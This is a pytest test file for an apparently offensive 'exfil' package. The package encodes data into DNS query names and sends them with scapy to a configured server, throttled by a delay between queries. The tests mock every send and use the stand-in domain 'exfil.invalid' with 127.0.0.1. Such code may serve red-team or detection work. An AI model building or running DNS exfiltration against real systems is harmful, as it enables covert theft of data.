"""Tests for DNSSender and ExfilResult."""

from __future__ import annotations

import logging
from unittest.mock import MagicMock, call, patch

import pytest

from exfil.config import ExfilConfig
from exfil.dns_sender import DNSSender, ExfilResult
from exfil.encoder import DNSExfilEncoder

logger = logging.getLogger(__name__)

# Patch target for scapy's send() as imported into dns_sender's namespace.
_SEND_TARGET = "exfil.dns_sender.send"
# Patch target for time.sleep as imported into dns_sender's namespace.
_SLEEP_TARGET = "exfil.dns_sender.time.sleep"


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def config():
    """Return an ExfilConfig with zero delay so tests run instantly."""
    return ExfilConfig(
        target_domain="exfil.invalid",
        dns_server="127.0.0.1",
        chunk_size=30,
        inter_query_delay_seconds=0.0,  # prevents real sleeping in tests
        src_port=12345,
    )


@pytest.fixture
def sender(config):
    """Return a DNSSender built from the test config."""
    return DNSSender(config)


# ---------------------------------------------------------------------------
# ExfilResult shape
# ---------------------------------------------------------------------------


def test_exfil_result_fields():
    """Asserts ExfilResult can be instantiated and errors defaults to []."""
    result = ExfilResult(
        chunks_sent=3,
        bytes_encoded=42,
        total_queries=4,
        elapsed_seconds=1.5,
        queries_per_second=2.67,
        target_domain="exfil.invalid",
        dns_server="127.0.0.1",
    )
    assert result.chunks_sent == 3
    assert result.bytes_encoded == 42
    assert result.total_queries == 4
    assert result.elapsed_seconds == 1.5
    assert result.queries_per_second == 2.67
    assert result.target_domain == "exfil.invalid"
    assert result.dns_server == "127.0.0.1"
    assert result.errors == []


# ---------------------------------------------------------------------------
# send_query behaviour
# ---------------------------------------------------------------------------


def test_send_query_returns_true_on_success(sender):
    """Asserts send_query returns True when scapy send() succeeds."""
    with patch(_SEND_TARGET) as mock_send:
        result = sender.send_query("test.exfil.invalid")
    assert result is True
    mock_send.assert_called_once()


def test_send_query_returns_false_on_exception(sender):
    """Asserts send_query returns False when scapy send() raises."""
    with patch(_SEND_TARGET, side_effect=OSError("mock error")):
        result = sender.send_query("test.exfil.invalid")
    assert result is False


def test_send_query_packet_structure(sender, config):
    """Asserts the crafted packet has correct IP dst, UDP dport=53, and DNS rd=1."""
    captured = {}

    def capture_packet(pkt, **kwargs):
        captured["pkt"] = pkt

    with patch(_SEND_TARGET, side_effect=capture_packet):
        sender.send_query("test.exfil.invalid")

    pkt = captured["pkt"]
    # Check layers by string name to avoid importing scapy in tests.
    assert pkt["IP"].dst == config.dns_server
    assert pkt["UDP"].dport == 53
    assert pkt["DNS"].rd == 1


# ---------------------------------------------------------------------------
# exfiltrate — empty data
# ---------------------------------------------------------------------------


def test_exfiltrate_empty_returns_zero_result(sender):
    """Asserts exfiltrate(b'') returns an all-zero ExfilResult."""
    result = sender.exfiltrate(b"")
    assert result.chunks_sent == 0
    assert result.bytes_encoded == 0
    assert result.total_queries == 0
    assert result.elapsed_seconds == 0.0
    assert result.errors == []


def test_exfiltrate_empty_sends_nothing(sender):
    """Asserts exfiltrate(b'') never calls send_query."""
    with patch.object(sender, "send_query") as mock_sq:
        sender.exfiltrate(b"")
    mock_sq.assert_not_called()


# ---------------------------------------------------------------------------
# exfiltrate — math / field values
# ---------------------------------------------------------------------------


def test_exfiltrate_chunk_and_query_counts(sender, config):
    """Asserts chunks_sent, total_queries, and bytes_encoded match encoder output."""
    data = b"hello world"  # 11 bytes
    enc = DNSExfilEncoder(
        target_domain=config.target_domain,
        chunk_size=config.chunk_size,
    )
    er = enc.encode(data)

    with patch.object(sender, "send_query", return_value=True):
        result = sender.exfiltrate(data)

    assert result.chunks_sent == er.chunk_count
    assert result.total_queries == len(er.fqdns)
    assert result.bytes_encoded == 11  # len(b"hello world")


def test_exfiltrate_target_domain_in_result(sender, config):
    """Asserts result.target_domain matches the config value."""
    with patch.object(sender, "send_query", return_value=True):
        result = sender.exfiltrate(b"domain check")
    assert result.target_domain == config.target_domain


def test_exfiltrate_dns_server_in_result(sender, config):
    """Asserts result.dns_server matches the config value."""
    with patch.object(sender, "send_query", return_value=True):
        result = sender.exfiltrate(b"server check")
    assert result.dns_server == config.dns_server


# ---------------------------------------------------------------------------
# exfiltrate — error collection
# ---------------------------------------------------------------------------


def test_exfiltrate_errors_on_send_failure(sender):
    """Asserts errors list is populated for every failed send_query call."""
    with patch.object(sender, "send_query", return_value=False):
        result = sender.exfiltrate(b"fail test")
    assert len(result.errors) == result.total_queries
    assert all(e.startswith("query failed:") for e in result.errors)


def test_exfiltrate_no_errors_on_success(sender):
    """Asserts errors list is empty when all send_query calls succeed."""
    with patch.object(sender, "send_query", return_value=True):
        result = sender.exfiltrate(b"success test")
    assert result.errors == []


# ---------------------------------------------------------------------------
# exfiltrate — timing / sleep behaviour
# ---------------------------------------------------------------------------


def test_sleep_called_n_minus_1_times(sender):
    """Asserts time.sleep is called exactly total_queries - 1 times."""
    with patch.object(sender, "send_query", return_value=True), \
         patch(_SLEEP_TARGET) as mock_sleep:
        result = sender.exfiltrate(b"timing test data")
    assert mock_sleep.call_count == result.total_queries - 1


def test_sleep_not_called_for_single_query(sender, config):
    """Asserts sleep is called exactly once (between data chunk and terminator) for a 1-chunk payload."""
    # 1 byte -> 2 hex chars -> fits in chunk_size=30 -> exactly 1 data chunk + 1 terminator = 2 queries.
    data = b"x"
    with patch.object(sender, "send_query", return_value=True), \
         patch(_SLEEP_TARGET) as mock_sleep:
        result = sender.exfiltrate(data)
    # 2 total queries means exactly 1 sleep (between the two).
    assert result.total_queries == 2
    assert mock_sleep.call_count == 1


def test_sleep_uses_configured_delay(sender, config):
    """Asserts every sleep call uses config.inter_query_delay_seconds."""
    cfg = ExfilConfig(
        target_domain="exfil.invalid",
        dns_server="127.0.0.1",
        chunk_size=30,
        inter_query_delay_seconds=0.25,  # non-zero to make assertion meaningful
        src_port=12345,
    )
    s = DNSSender(cfg)
    with patch.object(s, "send_query", return_value=True), \
         patch(_SLEEP_TARGET) as mock_sleep:
        s.exfiltrate(b"delay check")
    assert mock_sleep.call_count > 0
    for c in mock_sleep.call_args_list:
        assert c == call(0.25)


# ---------------------------------------------------------------------------
# queries_per_second
# ---------------------------------------------------------------------------


def test_qps_nonzero_for_real_elapsed(sender):
    """Asserts queries_per_second > 0 when elapsed time is non-zero."""
    with patch.object(sender, "send_query", return_value=True):
        # inter_query_delay_seconds=0.0 so no real sleep; monotonic will still advance.
        result = sender.exfiltrate(b"qps test")
    assert result.queries_per_second > 0


def test_qps_zero_for_zero_elapsed():
    """Asserts ExfilResult with elapsed_seconds=0.0 stores queries_per_second as 0.0."""
    result = ExfilResult(
        chunks_sent=1,
        bytes_encoded=5,
        total_queries=2,
        elapsed_seconds=0.0,
        queries_per_second=0.0,  # caller's responsibility when elapsed is 0
        target_domain="exfil.invalid",
        dns_server="127.0.0.1",
    )
    assert result.queries_per_second == 0.0
